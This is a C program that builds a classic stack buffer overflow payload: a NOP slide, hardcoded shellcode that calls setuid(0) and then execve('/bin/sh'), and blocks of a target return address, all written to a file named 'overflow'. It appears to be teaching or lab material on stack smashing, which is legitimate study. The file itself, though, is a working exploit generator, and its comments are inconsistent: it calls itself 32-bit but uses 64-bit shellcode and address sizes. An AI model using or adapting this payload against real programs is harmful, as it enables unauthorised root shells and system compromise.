#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>

/************************************************
*   Builds an egg for 32bit buffer overflow     *
*       Parts:                                  *
*        ----------------                       *
*       |    NOP slide   |                      *
*        ----------------                       *
*       |    Shellcode   |                      *
*        ----------------                       *
*       | Address Blocks |                      *
*        ----------------                       *
*                                               *
* REMINDER: Addr. Block must be aligned on a    *
*   long boundary. Shellcode is hardcoded to    *
*   make alignment easier. If shellcode is      *
*   modified, user must also alter SHELLSZ var. *
************************************************/

/* REMINDER: Change this number to the new byte anount if shellcode is changed */
#define SHELLSZ     48
#define NOP         0x90
#define OFFSZ       200


//Shellcode is prepended with 3 NOPs to make byte length 48 for better alignment.
// Current shellcode: Unix - /bin/sh
char mkshell[] =
    "\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62"
    "\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31"
    "\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c"
    "\x58\x0f\x05";

int main(int argc, char *argv[]) {
    char *buf, *shell;
    unsigned long long **addp;
    unsigned long nopsz, shellsz, addsz, bsize, offset, addr;
    int i,fd;
    
    if(argc != 4 && argc != 5) {
        fprintf(stderr, "Usage: %s <nop slide len.> <address block len.> <SP Address> [offset]\n", argv[0]);
        exit(-1);
    }
    
    offset = (unsigned long)OFFSZ;
    errno = 0;
    nopsz = strtol(argv[1], NULL, 0);
    addsz = strtol(argv[2], NULL, 0);
    addr = strtoul(argv[3], NULL, 0);
    if(argc == 5) {
        offset = (unsigned long)strtol(argv[4], NULL, 0);
    }
    if(errno != 0) {
        fprintf(stderr, "Usage: %s <nop slide len.> <address block len.> <SP Address> [offset]\n", argv[0]);
        fprintf(stderr,"    Error: Non-decimal argument\n");
        exit(-1);
    }
    
    shellsz = SHELLSZ;
    
    printf("    Egg Structure\n");
    printf("        NOP Slide Size                  %ld\n", nopsz);
    printf("        Shellcode Size                  %ld\n", shellsz);
    printf("        Number of Addr. in Addr Block   %ld\n", addsz);
    printf("        Offset                          %ld\n", offset);
    printf("        Stack Address                   %ld\n", addr);
    addr = (unsigned long long)((unsigned long)addr - offset);
    printf("        Target Address                  %p\n", addr);
    
    addsz *= 4;
    bsize = nopsz+shellsz+8*addsz;
    
    if(!(buf = malloc(bsize+1))) {
        printf("Malloc failure\n");
        exit(0);
    }
    
    shell = buf + nopsz;
    
    for(i = 0; i < nopsz; i++)
        buf[i] = NOP;
    
    for(i = 0; i < shellsz; i++)
        *(shell++) = mkshell[i];
    
    addp = (unsigned long long **)(buf+nopsz+shellsz);
    while((char *)addp < buf+bsize) {
        *(addp++) = (unsigned long long *)addr;
    }
    
    buf[bsize] = '\0';
    
    // Name for the buffer exploit below here.
    if((fd = open("overflow",O_WRONLY|O_CREAT|O_TRUNC,0600)) < 0) {
        perror("overflow");
        exit(-1);
    }
    
    write(fd,buf,bsize+1);
    return(0);
}
